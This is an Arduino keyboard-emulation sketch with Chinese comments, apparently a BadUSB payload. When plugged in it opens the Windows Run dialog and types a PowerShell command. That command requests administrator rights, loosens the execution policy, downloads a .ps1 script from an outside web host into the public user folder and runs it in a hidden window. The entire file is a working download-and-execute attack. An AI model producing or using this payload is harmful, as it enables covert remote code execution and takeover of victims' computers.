void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(3000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /t:01 /k MODE con: cols=22  lines=6&POWERSHELL");
  delay(500);
  Keyboard.println("START-PROCESS POWERSHELL \" -NOP -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;EXIT\" -VERB RUNAS;(nEW-OBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\'HTTP://FQ.WC.LT/UP/1465394734.PS1\',\'C:\\USERS\\PUBLIC\\SELF.PS1\');POWERSHELL -NOP -W HIDDEN -C C:\\USERS\\PUBLIC\\SELF.PS1");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
  //Keyboard.release(KEY_LEFT_ALT);
 // Keyboard.press(KEY_LEFT_ALT);
 // Keyboard.print('y');
  //Keyboard.release(KEY_LEFT_ALT);
  //Keyboard.release(KEY_LEFT_ALT);
  //Keyboard.release(KEY_LEFT_ALT);
  //Keyboard.release(KEY_LEFT_ALT);
  //delay(50);
}
